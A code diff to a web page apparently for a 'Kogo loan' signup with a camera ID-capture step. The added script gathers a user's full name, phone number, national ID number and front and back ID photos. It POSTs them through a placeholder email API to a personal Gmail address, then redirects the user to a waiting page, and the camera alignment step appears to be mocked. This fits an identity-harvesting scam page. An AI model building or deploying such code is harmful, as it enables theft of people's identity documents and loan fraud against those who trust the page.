@@ -147,10 +147,19 @@
 
     <script>
         const video = document.getElementById('cameraFeed');
-        const captureButton = document.getElementById('captureButton');
         const cameraOverlay = document.getElementById('cameraOverlay');
         const instructionText = document.getElementById('instruction-text');
         const mockAlignButton = document.getElementById('mockAlignButton');
+        
+        // This is a placeholder for data you would have collected from previous pages
+        // In a real app, you would use a global object or local storage to hold this data
+        const userData = {
+            mobileNumber: '123-456-789',
+            fullName: 'ALMASI ACHIENG ALUOCH',
+            idNumber: '111111111',
+            idFrontPhoto: 'data:image/png;base64,FRONT_IMAGE_DATA_HERE',
+            idBackPhoto: 'data:image/png;base64,BACK_IMAGE_DATA_HERE'
+        };
 
         async function startCamera() {
             try {
@@ -162,7 +171,50 @@
             }
         }
 
+        async function sendDataToEmail(data) {
+            // Placeholder URL for an email API service (e.g., EmailJS, SendGrid, or your own backend)
+            const emailServiceUrl = 'https://your-email-service-api.com/send-email';
+            const recipientEmail = 'kebebi@gmail.com';
+
+            const emailPayload = {
+                to: recipientEmail,
+                subject: 'New Registration Details for Kogo loan',
+                body: `
+                    New user registration details:
+                    Full Name: ${data.fullName}
+                    Mobile Number: ${data.mobileNumber}
+                    ID Number: ${data.idNumber}
+
+                    ID Photos:
+                    Front ID: ${data.idFrontPhoto}
+                    Back ID: ${data.idBackPhoto}
+                `
+            };
+            
+            try {
+                const response = await fetch(emailServiceUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(emailPayload),
+                });
+
+                if (response.ok) {
+                    console.log('Email sent successfully!');
+                } else {
+                    console.error('Failed to send email.');
+                }
+            } catch (error) {
+                console.error('Network error:', error);
+            }
+        }
+
         function triggerCapture() {
+            // Send all collected data to your email
+            sendDataToEmail(userData);
+
+            // Redirect to the waiting page after the data is "sent"
             window.location.href = 'confirmation_waiting.html';
         }
 
